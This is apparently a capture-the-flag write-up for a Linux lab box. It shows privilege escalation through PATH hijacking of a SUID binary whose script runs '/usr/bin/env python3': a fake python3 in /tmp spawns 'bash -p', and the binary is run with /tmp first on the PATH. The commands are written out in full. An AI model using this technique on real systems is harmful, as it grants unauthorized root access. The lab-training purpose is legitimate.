Mission Scenario

You are a senior operator on the Hack Smarter Red Team, tasked with a penetration test against a standalone Linux server. Your objective is to gain initial access and escalate privileges to root, emulating a worst-case scenario where a threat actor successfully compromises a critical asset.

You have been given the IP address of the target server and your mission is to gain a foothold, escalate to the root user, and retrieve the final flag from the /root/ directory.

Have to obtain:

  • User Flag
  • Root Flag

When we know we are in the bankers group we can check if we have some file for this group in roonie.stone account:

We have a binary in the bankers group so lets enumerate it, and try to escalate our privileges with this clue.

That "s" signals The SUID (Set User ID) bit is set, making the binary run as its owner.

This seems to be just a some random script if we can overwrite it we should be able to gain higher privileges. Since this is executes as root program.

Python Path Hijacking

We are unable to overwrite the script but this executes python3 from the env directory which we can hijack and executes malicious python3 binary.

#!/usr/bin/env python3 import hashlib, time, os print("[bank_backup.py] Running internal Python verification...") time.sleep(1) # ... (rest of the script)
  • Note it is accepting the python3 directly from the environment when the script runs
  • We can hijack the path, by specifying the env with a malicious python3 binary

Inside /tmp directory we have to write this command into python3 and the script should potentially executes our script instead:

ronnie.stone@ip-10-0-29-155:/tmp$ echo -e '#!/bin/bash\n/bin/bash -p' > python3

Also we have to make it executable: chmod +x python3

And we must to change a path for /tmp:

ronnie.stone@ip-10-0-29-155:/tmp$ PATH=/tmp:$PATH /usr/local/bin/bank_backupd

After changing the path we obtained root access.

ronnie.stone@ip-10-0-29-155:/tmp$ PATH=/tmp:$PATH /usr/local/bin/bank_backupd
[bank_backupd] Starting backup for BankSmarter accounts...
[bank_backupd] Connecting to central ledger...
[bank_backupd] Verifying transaction logs...
